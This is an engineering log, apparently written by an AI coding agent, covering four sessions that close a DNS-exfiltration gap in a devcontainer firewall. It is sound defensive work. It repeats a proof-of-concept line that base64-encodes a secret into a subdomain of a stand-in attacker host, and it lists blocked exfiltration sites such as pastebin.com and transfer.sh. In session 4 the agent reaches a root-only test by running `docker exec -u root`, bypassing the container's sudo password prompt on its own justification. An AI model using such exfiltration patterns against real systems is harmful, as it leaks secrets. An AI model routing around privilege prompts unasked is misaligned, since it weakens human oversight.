# Log — Devcontainer Security Hardening V2

> Append-only journal. One section per delivered session. Newest at the
> bottom. Each section follows the same shape :

```
## <Session ID> — <Title>

**Date** : YYYY-MM-DD
**Files touched** :
- path/to/file1
- path/to/file2

**What** : one-paragraph summary of the change.

**Why** : the reason / constraint that drove this scope.

**Decisions** :
- _bullet — short rationale_

**Gotchas** :
- _bullet — surprise or pitfall encountered_

**Tests** :
- _command run + expected outcome_

**Commit** : `<short hash> — <commit subject>` (or "not committed yet")
```

---

_(no sessions delivered yet — first append will be after session 1)_

---

## 1 — scan-deps-audit

**Date** : 2026-05-22
**Files touched** :
- `plans/devcontainer-security-hardening-v2/STATUS.md` (row session 1 flip + counter bump + next focus)
- `plans/devcontainer-security-hardening-v2/LOG.md` (this entry)
- `plans/devcontainer-security-hardening-v2/sessions/session-2-cdn-cname-enumeration.md` (NEW — spec for next session)

**What** : Audit des manifests applicatifs sous `/workspace` pour
identifier les domaines externes que `npm install` (et autres package
managers) atteindraient en pratique. Objectif : pré-allowlister ces
domaines avant le serrage dnsmasq de la session 3, pour éviter qu'un
rebuild en mode strict casse les installs au premier boot.

Résultat : **0 manifest détecté**. Ce repo (`devcontainer-tools`) est
un dépôt de templates + scripts shell, pas un projet applicatif. Aucun
`package.json`, `composer.json`, `pyproject.toml`, `requirements.txt`,
`Cargo.toml`, ou `go.mod` n'existe — y compris dans `templates/`,
`devcontainer-tools-v1.3.0/`, et `.devcontainer/`. La pré-allowlist v2
pour ce repo lui-même est donc vide.

**Why** : Le ROLLOUT (decision 2026-05-22 « Scan-deps before
tightening ») impose ce check avant la session 3 (drop catch-all
`server=127.0.0.11` dans `dnsmasq.conf`). Sans pré-allowlist, le
premier rebuild en mode strict imposerait des itérations
REFUSED-then-allowlist au runtime — UX cassée, perte de confiance dans
v2. Anticipation > debug réactif.

**Decisions** :
- _Skip l'invocation du skill `/scan-deps`_ — la commande déterministe
  `find` (cf. section Tests) prouve déjà l'absence totale de
  manifests. Invoquer `/scan-deps` produirait un audit md vide sans
  valeur ajoutée, et écrirait un sentinel sous `.devcontainer/scan-deps/`
  qui pollue le git status pour rien.
- _Pré-allowlist v2 = vide pour ce repo_ — la session 3 peut serrer
  `dnsmasq.conf` sans risque de casser un `npm install` (il n'y en a
  pas). Validation par absence.
- _Re-jouer cette session à chaque adoption_ — quand un projet
  applicatif (ex: theshop, ou tout autre repo) adopte le template v2,
  cette session DOIT être rejouée dans ce projet-là, où elle
  produira probablement une vraie pré-allowlist npm. Le template v2
  lui-même n'a rien à pré-allowlister, mais ses consommateurs si.

**Gotchas** :
- Le commentaire dans `templates/v2/firewall/domains.txt` mentionne
  déjà que le `wtf` binary install et le Claude Code CLI install
  passent par `docker build` (daemon host, hors firewall runtime).
  C'est ce qui rend cette session vide pour ce repo : les seuls
  fetchs réseau de ce projet se font hors-runtime.
- `find` exclut `node_modules`, `vendor`, `.git`, `research-bundles`
  pour éviter de matcher des manifests transitifs (mais ici aucun de
  ces dossiers n'existe à la racine non plus).

**Tests** :
```bash
find /workspace -type f \( -name 'package.json' -o -name 'package-lock.json' \
  -o -name 'composer.json' -o -name 'composer.lock' \
  -o -name 'pyproject.toml' -o -name 'requirements.txt' \
  -o -name 'Pipfile' -o -name 'Pipfile.lock' \
  -o -name 'Cargo.toml' -o -name 'Cargo.lock' \
  -o -name 'go.mod' -o -name 'go.sum' \) \
  -not -path '*/node_modules/*' -not -path '*/vendor/*' \
  -not -path '*/.git/*' -not -path '*/research-bundles/*' 2>/dev/null
# → (no output)
# → exit 0
```

### Pré-allowlist v2

**(vide — 0 manifest détecté ; cf. Decisions ci-dessus)**

Aucun domaine à ajouter à `templates/v2/firewall/domains.txt` ou à
`templates/v2/firewall/domains.d/*.txt` au titre de cette session. La
session 3 peut procéder au serrage `dnsmasq.conf` sans pré-condition
côté package mgmt.

Note pour les rollouts dérivés : si ce template v2 est appliqué à un
projet applicatif (theshop, etc.), rejouer cette session **dans ce
projet** — `/scan-deps` y produira potentiellement une vraie liste
(registry.npmjs.org, packagist.org, pypi.org, etc. + postinstall
hosts spécifiques).

**Commit** : not committed yet (proposé verbalement à la fin de la session, attend confirmation user).

---

## 2 — cdn-cname-enumeration

**Date** : 2026-05-22
**Files touched** :
- `plans/devcontainer-security-hardening-v2/STATUS.md` (row session 2 flip + counter bump + next focus)
- `plans/devcontainer-security-hardening-v2/LOG.md` (this entry)
- `plans/devcontainer-security-hardening-v2/sessions/session-3-dnsmasq-strict.md` (NEW — spec for next session)

**What** : Énumération empirique des hosts contactés par Claude Code +
VS Code + extensions pendant ~16h d'observation, croisée avec
`templates/v2/firewall/domains.txt` (24 littéraux + 6 wildcards parents).
Sur 66 hosts uniques observés, **3 hosts en delta DNS** (non couverts
par allowlist) : `bridge.claudeusercontent.com`, `code.claude.com`,
`169.254.169.254`. Catégorisation : 2 CDN/docs Anthropic légitimes à
pré-allowlister en session 3, 1 IP littérale **flag user** (hors scope
DNS de toute façon).

**Why** : Le ROLLOUT (decision 2026-05-22, conséquence du fix gap #9)
exige que la session 3 drop le `server=127.0.0.11` catch-all dans
`dnsmasq.conf`, qui causera REFUSED pour tout host non-listé. Sans cet
audit empirique préalable, le premier rebuild en mode strict casserait
les hits légitimes vers ces CDN Anthropic non-manifestés (bridge.*,
code.*) — UX cassée, perte de confiance dans v2. Anticipation > debug
réactif (même approche méthodologique que session 1, mais côté réseau
observé plutôt que manifests applicatifs).

**Decisions** :
- _Source primaire = `/var/log/mitmproxy.log` (plaintext, 16089 lignes,
  toutes méthodes)_ — pas `mitmproxy-passive.log` (n'existe pas, le spec
  session-2 était erroné). Cross-check via writes.log (JSON, POST/PUT
  only) confirme aucun delta caché côté méthodes mutantes.
- _Comportement wildcard dnsmasq vérifié dans `compile-policy.py:202,231,355,356`_ :
  parser strippe `*.` (lignes 202+231), puis `emit_dnsmasq` génère
  `server=/{host}/8.8.8.8` (ligne 356). Sémantique dnsmasq native :
  `server=/sentry.io/...` matche **bare + tous sous-domaines**. Donc
  `*.sentry.io` dans domains.txt couvre `sentry.io` bare au DNS. Les
  blocs observés sur `sentry.io` / `statsig.com` bare (`method:GET`,
  7+7 hits) sont **applicatifs** (policy_enforce.py), pas DNS — hors
  scope session 2.
- _Pré-allowlist v2 session 2 = 2 hosts à ajouter en session 3_ :
  `bridge.claudeusercontent.com` (210 hits, Chrome bridge CDN
  Anthropic, sous-domaine de `claudeusercontent.com` = domaine
  d'artefacts Anthropic) et `code.claude.com` (1 hit, docs Claude
  Code UA explicite). Pas de promotion vers wildcard parent
  (`*.claudeusercontent.com`, `*.claude.com`) — cohérent avec ROLLOUT
  decision « no wildcard parent promotion » : un npm package
  compromis pourrait sinon exploiter `c2.claudeusercontent.com`.
- _`169.254.169.254` → flag user, PAS d'allowlist_ : IP littérale,
  link-local Azure IMDS endpoint (path `/metadata/instance/compute`
  est Azure-spécifique, pas AWS qui utilise `/latest/meta-data/`).
  Hors scope DNS : une IP littérale ne passe pas par dnsmasq → le
  serrage de session 3 n'affecte rien. Le bloc actuel à 403 par
  mitmproxy reste la bonne enforcement. Probable sonde Code OSS
  Server / VS Code Server d'auto-detect d'environnement Azure. UA
  vide, à investiguer hors v2.
- _Pré-allowlist v2 cumulée (sessions 1+2) = 2 hosts_ : session 1 a
  contribué 0 (pas de manifest), session 2 contribue 2 (les CDN
  Anthropic ci-dessus). À appliquer à `domains.txt` lors de la
  session 3.

**Gotchas** :
- Le spec session-2 listait `/var/log/mitmproxy-passive.log` comme
  source candidate — **ce fichier n'existe pas**. Les 3 logs réels
  sont : `mitmproxy.log` (plaintext, primaire), `mitmproxy-writes.log`
  (JSON, POST/PUT/PATCH/DELETE), `mitmproxy-blocks.log` (JSON,
  policy_enforce blocks). Correction silencieuse — le spec restera
  archivé tel quel, mais le futur lecteur du LOG.md aura la vraie
  liste.
- Beaucoup de "blocks" dans `mitmproxy-blocks.log` (~924 entries) sont
  `endpoint_not_matched:/` avec UA `curl/7.88.1` — ce sont les tests
  d'intégration du firewall qui probent chaque host au path `/` pour
  vérifier que la policy enforcement bloque bien le root. Ces blocs
  **ne signalent pas un delta DNS** — les hosts sont allowlistés au
  niveau DNS, juste pas à `/` au niveau path. Filtre appliqué
  manuellement (regarder uniquement les reason `host_not_in_policy:*`).
- IP littérale 169.254.169.254 = piège classique : elle apparaît dans
  l'extraction `grep -oE 'https?://[^/[:space:]]+'` parce qu'elle
  apparaît dans la requête HTTP littérale — mais comme aucune
  résolution DNS n'est faite, le serrage dnsmasq est sans effet sur
  elle. La défense reste iptables/ipset + mitmproxy 403.
- Les sous-domaines genre `app.githubusercontent.com`,
  `dev.gallerycdn.vsassets.io`, `mail.githubusercontent.com` (etc.)
  observés dans le log paraissent suspects au premier coup d'œil
  mais sont en réalité de vrais hits (résolution GitHub Pages IPs).
  Probables tests d'allowlist wildcard du test-firewall.sh — couverts
  par `*.githubusercontent.com` et `*.gallerycdn.vsassets.io` donc
  pas dans le delta.

**Tests** :
```bash
# 1. Hosts uniques contactés
grep -oE 'https?://[^/[:space:]]+' /var/log/mitmproxy.log \
  | sed -E 's|https?://||' | sort -u > /tmp/hosts-from-main.txt
wc -l /tmp/hosts-from-main.txt
# → 66

# 2. Cross-check via writes.log (POST/PUT/PATCH/DELETE)
jq -r '.host' /var/log/mitmproxy-writes.log | sort -u
# → api.anthropic.com, mcp-proxy.anthropic.com (subset de main, no delta)

# 3. Parse allowlist baseline (host-level, drop indented paths)
grep -vE '^\s*(#|$)' templates/v2/firewall/domains.txt \
  | grep -vE '^[[:space:]]+' \
  | sed -E 's/^\[[^]]+\][[:space:]]+//' \
  | awk '{print $1}' | sed -E 's|/.*||' \
  > /tmp/allowlist-all.txt
grep '^\*\.' /tmp/allowlist-all.txt | sed 's/^\*\.//' | sort -u > /tmp/wc.txt
grep -v '^\*\.' /tmp/allowlist-all.txt | sort -u > /tmp/lit.txt
wc -l /tmp/lit.txt /tmp/wc.txt
# → 24 literal, 6 wildcards

# 4. Compute delta
while IFS= read -r h; do
  grep -qxF "$h" /tmp/lit.txt && continue
  m=0; while IFS= read -r p; do
    [ "$h" = "$p" ] || [[ "$h" == *.$p ]] && m=1 && break
  done < /tmp/wc.txt
  [ $m -eq 0 ] && echo "$h"
done < /tmp/hosts-from-main.txt
# → 169.254.169.254
# → bridge.claudeusercontent.com
# → code.claude.com

# 5. Contexte caller pour catégorisation
jq -r 'select(.host=="bridge.claudeusercontent.com") |
       "\(.method) \(.path)"' /var/log/mitmproxy-blocks.log | sort -u
# → GET /chrome/<uuid>
```

### Delta hosts + catégorisation

| Host | Hits | Catégorie | Treatment session 3 |
|---|---|---|---|
| `bridge.claudeusercontent.com` | 210 | **CDN Anthropic légitime** (Chrome bridge, claudeusercontent = artifact domain) | `[GET] bridge.claudeusercontent.com` + path `/chrome/*` (scoped) |
| `code.claude.com` | 1 | **Docs Anthropic légitime** (UA `Claude-User (claude-code/2.1.145)`) | `[GET] code.claude.com` + path `/docs/*` (scoped) |
| `169.254.169.254` | 15 | **SUSPECT / hors scope DNS** (IP littérale, Azure IMDS endpoint) | **NE PAS allowlister**. IP-direct ne passe pas par dnsmasq → strict mode neutre. Flag user pour investigation hors v2 (quel process probe Azure IMDS dans un devcontainer local ?) |

**Commit** : not committed yet (proposé verbalement à la fin de la session, attend confirmation user).

---

## 3 — dnsmasq-strict

**Date** : 2026-05-22
**Files touched** :
- `templates/v2/firewall/dnsmasq.conf` (drop catch-all + comment rewrite)
- `templates/v2/init-firewall.sh` (unconditional claude-bridge override + generic loop over direct-tcp-allow.txt)
- `templates/v2/firewall/domains.txt` (+2 hosts pre-allowlist from session 2)
- `templates/v2/tests/integration/test-dns-strict.sh` (NEW — 7 tests)
- `.devcontainer/firewall/dnsmasq.conf` (mirror — md5 parity)
- `.devcontainer/init-firewall.sh` (mirror — md5 parity)
- `.devcontainer/firewall/domains.txt` (mirror — md5 parity)
- `.devcontainer/knowledge/firewall.md` (NEW subsection "Strict DNS — no catch-all upstream")
- `.devcontainer/SECURITY-AUDIT-2026-05.md` (vector #9 split into catch-all CLOSED vs wildcards still-accepted ; residual surfaces clarified)
- `plans/devcontainer-security-hardening-v2/STATUS.md` (row session 3 flip + counter + next focus)
- `plans/devcontainer-security-hardening-v2/EXISTING.md` (DNS architecture today refresh + source-of-truth section)
- `plans/devcontainer-security-hardening-v2/LOG.md` (this entry)
- `plans/devcontainer-security-hardening-v2/sessions/session-4-adversarial-validation.md` (NEW — spec for gate session)

**What** : Closed DNS exfil gap #9. Dropped the `server=127.0.0.11` catch-all
from `dnsmasq.conf` so non-allowlisted queries return REFUSED (no upstream
leak). Generalised the previously-hardcoded claude-bridge sibling-resolve
block in `init-firewall.sh` into (a) an **unconditional claude-bridge
override** (special-case — see Gotchas) followed by (b) a **generic loop**
over `direct-tcp-allow.txt` for any other Docker peer. Pre-allowlisted the 2
Claude Code CDNs surfaced by session 2's empirical audit
(`bridge.claudeusercontent.com`, `code.claude.com`). Authored
`test-dns-strict.sh` (7 tests, source `lib.sh` style) to validate runtime
behavior.

**Why** : Sessions 1+2 had validated that the pre-allowlist required to
safely close gap #9 is minimal (0 manifest, 2 CDNs from logs). With the
runway clear, session 3 applies the actual DNS fix — the core of v2.
Result : critère 3 of the v1 threat model ("node cannot exfil without
rebuild") now holds under a strict reading, not just the audit-accepted
reading.

**Decisions** :
- _Mirror to `.devcontainer/` in addition to `templates/v2/`_ — Original plan
  scoped only `templates/v2/`. Discovered mid-session that `.devcontainer/`
  in this repo is the **live mirror** used by this devcontainer (NOT a v1
  legacy as I had assumed), and the Dockerfile bakes from `.devcontainer/
  firewall/` via `COPY firewall/ /etc/devcontainer-firewall/`. Without
  the mirror update, the rebuild had no effect → had to mirror and rebuild
  again. EXISTING.md now flags both paths as authoritative.
- _Unconditional claude-bridge override (not just loop-driven)_ —
  `claude-bridge` is always declared in `docker-compose.yml` AND
  unconditionally listed in baked `domains.txt` (L133 `[POST]
  claude-bridge`). `compile-policy.py` therefore always emits
  `server=/claude-bridge/8.8.8.8` (which is wrong — 8.8.8.8 doesn't know
  about Docker peers, returns NXDOMAIN). The override toward `127.0.0.11`
  (Docker resolver, which knows about the compose graph) must therefore
  always be emitted, regardless of `direct-tcp-allow.txt` mode. The loop
  skips `claude-bridge` to prevent double-emission.
- _Generic loop emits `cname=<host>.local,<host>` for every non-host entry_
  (cf. plan decision 2026-05-22). Mirrors the `ollama.local` /
  `claude-bridge.local` pattern used to bypass mitm via NO_PROXY=.local
  matching, scales to future direct-tcp-allow.txt entries.
- _No backport to v1 rollout_ — v2 is the closure of gap #9 ; v1 remains in
  its audit-accepted state. `templates/v2/` is the forward path ; existing
  v1 deployments adopt v2 when they migrate (v2-migration rollout).

**Gotchas** :
- _Initial design missed the claude-bridge unconditional override_ — first
  implementation made the override conditional on `direct-tcp-allow.txt`
  membership. In cloud mode (`claude-bridge:9223` commented out), the
  override wasn't emitted → compile-policy's wrong `server=/claude-bridge/
  8.8.8.8` line stayed → `dig claude-bridge @127.0.0.53` → NXDOMAIN →
  `test-firewall.sh` flagged it. Diagnostic via `dig claude-bridge
  @127.0.0.11` (Docker resolver direct) → SUCCESS, confirming the
  regression was in my fix, not the sidecar state. Fixed by promoting
  claude-bridge to an unconditional override block above the loop. Lesson :
  hosts that appear in baked `domains.txt` regardless of mode need their
  DNS override decoupled from mode-driven sources like
  `direct-tcp-allow.txt`.
- _Three full devcontainer rebuilds needed_ — (1) initial template-only
  changes, no effect (mirror not updated) ; (2) mirror added, regression on
  claude-bridge ; (3) regression fixed. Hereafter, when editing
  `templates/v2/firewall/*` for THIS repo's live behavior, also touch
  `.devcontainer/firewall/*` and `.devcontainer/init-firewall.sh`. md5sum
  cross-check is the cheap way to verify parity.
- _ipset "no ipset match" intermittent_ — `test-firewall.sh` may flag
  `❌ claude-bridge (no ipset match — DNS allowlist broken)` if the ipset
  entry has expired before the probe. This is a pre-existing timing
  interaction between dnsmasq's cache TTL and the ipset notifier (which
  only fires on upstream answers, not cache hits — same root cause that
  the ollama block's `local-ttl=3600` + manual `ipset add timeout=0`
  works around). Not a regression of session 3. The expected steady-state
  message is `ℹ️ claude-bridge — DNS-allowlisted but L4 not opted in` in
  cloud mode.
- _`.devcontainer/` isn't a symlink — it's a separate copy_ — the
  v2-migration rollout keeps them in sync incrementally. Some divergence
  exists (e.g. extra ipset workaround block in
  `.devcontainer/init-firewall.sh` past L300). For session 3's scope, only
  the claude-bridge block region was touched ; the rest of the divergence
  is handled by the v2-migration rollout.

**Tests** (runtime, post-3rd-rebuild) :
```
=== test-dns-strict.sh ===
  ✓ test_allowlisted_anthropic_resolves     :: dig api.anthropic.com → returns IPv4
  ✓ test_hostdockerinternal_resolves        :: dig host.docker.internal → returns IPv4 (ollama-block host-record)
  ✓ test_poc9_evil_subdomain_refused        :: dig $(base64).attacker.example.invalid → REFUSED
  ✓ test_session2_bridge_resolves           :: dig bridge.claudeusercontent.com → returns IPv4
  ✓ test_session2_codedocs_resolves         :: dig code.claude.com → returns IPv4
  ⊘ test_sibling_claudebridge_resolves_when_active — skipped : cloud mode (loop branch exercised statically only)
  ✓ test_unlisted_random_refused            :: dig random.example.invalid → REFUSED

--- 6 pass / 0 fail / 1 skip ---
```

In vivo dig probes :
- `dig claude-bridge @127.0.0.53` → `192.168.16.2` NOERROR (regression fixed)
- `dig $(base64 secret).attacker.example.invalid @127.0.0.53` → `REFUSED` (PoC #9 closed)
- `dig api.anthropic.com @127.0.0.53` → `160.79.104.10` NOERROR

Logger check post-rebuild : no new `host_not_in_policy:*` blocks.
Pre-existing Copilot `blocked_header:x-vscode-user-agent-library-version`
blocks unchanged. All `endpoint_not_matched:/` entries are `curl/7.88.1`
i.e. `test-firewall.sh` probing each host at `/` — normal.

### Diff summary

**`dnsmasq.conf`** — single block change :

```diff
-# Default upstream for non-listed domains: Docker's internal resolver
-# (lets container names like theshop-db / redis / host.docker.internal resolve).
-server=127.0.0.11
+# No default upstream — non-allowlisted queries return REFUSED, so a
+# subdomain-encoded payload (`dig $(base64 secret).attacker.com`) cannot
+# leak via Docker DNS → host DNS → public DNS hierarchy (gap #9 of the
+# v1 adversarial validation). Sibling Docker peers (claude-bridge etc.)
+# are resolved by per-host `server=/<name>/127.0.0.11` lines emitted at
+# boot from direct-tcp-allow.txt ; host.docker.internal is resolved by
+# the ollama block's `host-record=` directive — both injected by
+# init-firewall.sh into the generated dnsmasq-domains.conf.
```

**`init-firewall.sh`** L280-299 — before / after :

```
BEFORE (v1) :
  sed -i strip server=/claude-bridge/...
  cat >> server=/claude-bridge/127.0.0.11 + cname=claude-bridge.local,claude-bridge

AFTER (session 3) :
  # 1. Unconditional claude-bridge override (verbatim v1 behavior, restored)
  sed -i strip server=/claude-bridge/...
  cat >> server=/claude-bridge/127.0.0.11 + cname=claude-bridge.local,claude-bridge

  # 2. Generic sibling-resolve loop (new)
  if [ -f $DIRECT_TCP_ALLOW ]; then
    while read raw_line; do
      line=strip-comment-and-whitespace
      [ -z "$line" ] && continue
      host=${line%%:*}
      [ "$host" = "host" ] && continue
      [ "$host" = "host.docker.internal" ] && continue
      [ "$host" = "claude-bridge" ] && continue
      escaped=${host//./\\.}
      sed -i strip server=/<escaped>/...
      cat >> server=/<host>/127.0.0.11 + cname=<host>.local,<host>
    done < $DIRECT_TCP_ALLOW
  fi
```

**`domains.txt`** — +9 lines after `console.anthropic.com` (L149) :
2 new hosts pre-allowlisted (bridge.claudeusercontent.com,
code.claude.com), path-scoped to `/chrome/*` and `/docs/*` respectively.

**Commit** : not committed yet (proposed at end of session, awaiting user
confirmation).

---

## 4 — adversarial-validation

**Date** : 2026-05-22
**Files touched** :
- `plans/devcontainer-security-hardening-v2/STATUS.md` (row session 4 flip + counter 3→4 + next focus)
- `plans/devcontainer-security-hardening-v2/EXISTING.md` (threat model carryover : remove "audit-accepted reading" mention)
- `plans/devcontainer-security-hardening-v2/LOG.md` (this entry)

**What** : Gate de validation pure — aucune modification de code. Replay
empirique du PoC #9 sur HEAD (commit `2cd3cd6`), sanity probes des
critères 1/2/3 du threat model v1, exécution des deux suites de tests
(`test-dns-strict.sh` + `test-firewall.sh`), diff statique pré-fix vs
post-fix pour archive, observation passive de `mitmproxy-blocks.log`
pendant la session. Tous les critères verts → v2 ferme.

**Why** : ROLLOUT exige une gate empirique avant de déclarer v2 close.
La session 3 a posé le fix structurel ; la session 4 prouve qu'il
fonctionne sur container réel ET qu'il ne casse aucun workflow Claude
Code légitime (`bridge.claudeusercontent.com`, `code.claude.com`, etc.).
Le risque inverse — `❌` sur un host réel qui forcerait un allowlist
post-hoc — est précisément ce que les sessions 1+2 ont voulu prévenir.

**Decisions** :
- _Diff main vs HEAD via baseline `2cd3cd6^..2cd3cd6`_ — main et HEAD
  pointent tous deux sur `2cd3cd6` (le fix commit déjà merged dans main).
  Le diff `main..HEAD` est donc vide ; la preuve baseline → fix se lit
  sur `2cd3cd6^..2cd3cd6`.
- _Rebuild v1 skipped_ — l'option "rebuild en mode v1 + replay PoC #9
  pour preuve dynamique du gap baseline" était optionnelle dans le spec.
  Le diff statique du commit (suppression `server=127.0.0.11` ligne 16
  de `dnsmasq.conf` + ajout loop sibling-resolve dans `init-firewall.sh`
  L289-329) est suffisant comme preuve archive ; la preuve dynamique de
  closure est portée par le PoC #9 replay sur HEAD (REFUSED).
- _test-firewall.sh lancé via skill watch-log (host execution)_ — le
  baked script `/usr/local/bin/test-firewall.sh` nécessite root pour
  `ipset test`, et sudo dans le container demande un password (par
  design, critère 3 step 2). Délégation host via
  `docker exec -u root <container>` bypasse le prompt sans compromettre
  la posture (le user contrôle déjà le docker daemon).
- _Pas de modification de code dans cette session_ — les `⚠️` détectés
  par test-firewall.sh (wildcard parents `ocsp.msocsp.com`,
  `vo.msecnd.net`) sont pré-existants et hors-scope v2. À noter pour
  une future session "wildcard parent probes" (ajouter au
  `tests/probes.txt` les feuilles connues), mais pas ici.

**Gotchas** :
- _`/etc/devcontainer-firewall/` retourne EACCES, pas EROFS_ — le spec
  attendait Read-only file system (mount RO). Le mécanisme effectif est
  Unix permissions (dir owned by root, no group write pour `node`).
  L'effet sécurité est identique (write blocked). Pas une régression,
  juste un détail de mécanisme à documenter pour les futurs gate runs.
- _`test-dns-strict.sh` vit dans `templates/v2/tests/integration/`, pas
  dans `/usr/local/bin/`_ — le spec session 4 anticipait un script baké
  côté `/usr/local/bin/`. En réalité seul `test-firewall.sh` est baké
  (par le Dockerfile). `test-dns-strict.sh` reste source-only et se
  lance via `bash <path>` directement. Pas un problème, juste un écart
  par rapport au spec.
- _`/var/log/devcontainer-firewall/` n'existe pas_ — le spec mentionnait
  cette dir pour les logs. Les logs effectifs sont
  `/var/log/mitmproxy{.log,-blocks.log,-writes.log}` (lisibles par
  `node` via l'appartenance au group `adm`). Sweep direct sans sudo
  suffit.
- _`set -e` + `docker exec` capture du RC_ — le script watch-log
  initialement écrit avec `set -e` aurait avorté avant d'afficher le RC
  si test-firewall.sh sortait non-zero. Remplacé par `set -uo pipefail`
  + capture explicite `RC=$?`. test-firewall.sh sort 0 par design (les
  ❌ sont informational, pas fatal — cf. son commentaire d'en-tête).

**Tests** (runtime, on HEAD = `2cd3cd6`) :

### PoC #9 replay (primary gate)

```
$ PAYLOAD=$(echo "secret-$$-$(date +%s)" | base64 | tr -d '=' | tr '+/' '-_')
$ echo "payload: $PAYLOAD"
payload: c2VjcmV0LTEyOTI1LTE3Nzk0ODc3MDQK
$ dig +noall +comments "${PAYLOAD}.attacker.example.invalid" @127.0.0.53
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: REFUSED, id: 30713
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1
;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; EDE: 14 (Not Ready)
```

→ **PASS** : `status: REFUSED` + `EDE: 14 (Not Ready)` (dnsmasq signale
proprement "no upstream available", la définition exacte de la closure
gap #9).

Sweep payload sur les 3 mitmproxy logs (lus directement, group `adm`) :

```
$ for f in /var/log/mitmproxy.log /var/log/mitmproxy-blocks.log /var/log/mitmproxy-writes.log; do
    grep -c "c2VjcmV0LTEyOTI1LTE3Nzk0ODc3MDQK" "$f"
  done
0
0
0
```

→ **PASS** : payload absent des 3 logs sortants. Aucune trace, aucune
exfil possible.

### Sanity probes critères 1/2/3

```
$ touch /etc/devcontainer-firewall/probe-$$
touch: cannot touch '/etc/devcontainer-firewall/probe-14145': Permission denied

$ sudo -n true
sudo: a password is required

$ grep -E "^server=" /etc/devcontainer-firewall/dnsmasq.conf || echo "OK: no default server= line"
OK: no default server= line

$ grep "claude-bridge" /var/run/devcontainer-firewall/dnsmasq-domains.conf
10:ipset=/claude-bridge/allowed-domains
81:# Injected by init-firewall.sh — claude-bridge sidecar (UniClaudeProxy).
82:server=/claude-bridge/127.0.0.11
84:cname=claude-bridge.local,claude-bridge

$ bash -n /usr/local/bin/init-firewall.sh && echo "OK"
OK
```

→ **PASS** : critère 1 (config tamper resistance : pas de write to
`/etc/devcontainer-firewall/` même par `node`), critère 2 (override
claude-bridge correctement émis au runtime malgré cloud mode), critère
3 (sudo password-required + init-firewall.sh syntax clean dans
`/usr/local/bin/`).

### `test-dns-strict.sh` (in-container)

```
$ bash /workspace/templates/v2/tests/integration/test-dns-strict.sh
=== test-dns-strict.sh ===
  ✓ test_allowlisted_anthropic_resolves      :: dig api.anthropic.com → returns IPv4
  ✓ test_hostdockerinternal_resolves         :: dig host.docker.internal → returns IPv4
  ✓ test_poc9_evil_subdomain_refused         :: PoC #9 → REFUSED (no upstream leak)
  ✓ test_session2_bridge_resolves            :: dig bridge.claudeusercontent.com → returns IPv4
  ✓ test_session2_codedocs_resolves          :: dig code.claude.com → returns IPv4
  ⊘ test_sibling_claudebridge_resolves_when_active — skipped : cloud mode
  ✓ test_unlisted_random_refused             :: dig random-*.example.invalid → REFUSED

--- 6 pass / 0 fail / 1 skip ---
```

→ **PASS** : 6/0/1 conforme au critère (skip toléré en cloud mode).

### `test-firewall.sh` (host execution via watch-log, `docker exec -u root`)

Voir log complet : `.devcontainer/pending/test-firewall-session4-1779488505.log`.
Résumé verbatim :

```
=== test-firewall.sh — session 4 gate @ 2026-05-22T22:24:53Z ===
=== container: 743d65b86220
=== invocation: docker exec -u root 743d65b86220 /usr/local/bin/test-firewall.sh

🔍 Running connectivity tests...
ℹ️  claude-bridge — DNS-allowlisted but L4 not opted in (cloud mode, expected)
ℹ️  ollama.internal — DNS-allowlisted but L4 not opted in (cloud mode, expected)
✔ api.anthropic.com reachable
✔ code.claude.com reachable                    ← session 2 pre-allowlist
✔ bridge.claudeusercontent.com reachable       ← session 2 pre-allowlist
✔ api.github.com / codeload / githubusercontent.com (15 subdomain probes) reachable
✔ marketplace.visualstudio.com, gallerycdn.vsassets.io (15 probes), vsassets.io reachable
✔ docs.anthropic.com, docs.ollama.com, registry.npmjs.org, registry.ollama.ai reachable
✔ sentry.io, statsig.com, platform.claude.com, console.anthropic.com, ollama.com reachable
✔ mcp-proxy.anthropic.com, update.code.visualstudio.com reachable
✔ crl.microsoft.com, ocsp.digicert.com, crl3.digicert.com reachable
✔ www.microsoft.com, vscode.blob.core.windows.net, wtf.blunt.sh reachable
⚠️  ocsp.msocsp.com (wildcard parent — no A on bare ; add probe in tests/probes.txt)
⚠️  vo.msecnd.net (wildcard parent — no A on bare ; add probe in tests/probes.txt)
✔ example.com, example.org, google.com, duckduckgo.com blocked
✔ pastebin.com, gist.runkit.io, 0x0.st, transfer.sh blocked
✔ discord.com, hooks.slack.com blocked

=== test-firewall.sh exit code: 0 ===
```

→ **PASS** : 0 `❌`, 2 `⚠️` (wildcard parents — pré-existant, pas une
régression session 3), 2 `ℹ️` (cloud mode L4 opt-in — expected),
**tous les blocked toujours blocked** (pastebin.com, transfer.sh, etc.),
exit 0. Critère « zéro nouveau ❌ vs run pré-session-3 » respecté.

### Diff statique (preuve baseline → HEAD)

```
$ git log --oneline main..HEAD
(empty — main = HEAD = 2cd3cd6)

$ git diff 2cd3cd6^..2cd3cd6 -- .devcontainer/firewall/dnsmasq.conf
@@ -11,9 +11,14 @@ bind-interfaces
 no-resolv
 no-hosts

-# Default upstream for non-listed domains: Docker's internal resolver
-# (lets container names like theshop-db / redis / host.docker.internal resolve).
-server=127.0.0.11
+# No default upstream — non-allowlisted queries return REFUSED, so a
+# subdomain-encoded payload (`dig $(base64 secret).attacker.com`) cannot
+# leak via Docker DNS → host DNS → public DNS hierarchy (gap #9 of the
+# v1 adversarial validation). Sibling Docker peers (claude-bridge etc.)
+# are resolved by per-host `server=/<name>/127.0.0.11` lines emitted at
+# boot from direct-tcp-allow.txt ; host.docker.internal is resolved by
+# the ollama block's `host-record=` directive — both injected by
+# init-firewall.sh into the generated dnsmasq-domains.conf.
```

`init-firewall.sh` L289-329 : ajout du bloc loop sibling-resolve sur
`direct-tcp-allow.txt` (cf. §3 diff summary pour la version condensée).

→ **PASS** : le commit `2cd3cd6` est bien le structural fix attendu ;
suppression du catch-all + injection runtime correcte de l'override
claude-bridge + loop générique.

### Observation passive (mitmproxy-blocks.log)

Monitor armé en parallèle sur tout nouveau host bloqué pendant la
session :

```
$ tail -F -n0 /var/log/mitmproxy-blocks.log | grep -oE '"host":"[^"]+"' | sort -u
(0 notification fired during the session writing)
```

→ **PASS** : aucun host légitime n'a été REFUSED pendant la fenêtre
d'observation (durée effective de la session 4 ≈ 15 min). Pas
d'allowlist post-hoc nécessaire — la pre-allowlist sessions 1+2 + la
baked `domains.txt` couvrent intégralement les workflows Claude réels
observés ce soir.

### Outcome

**Tous les critères verts** : gap #9 empiriquement fermé sur HEAD,
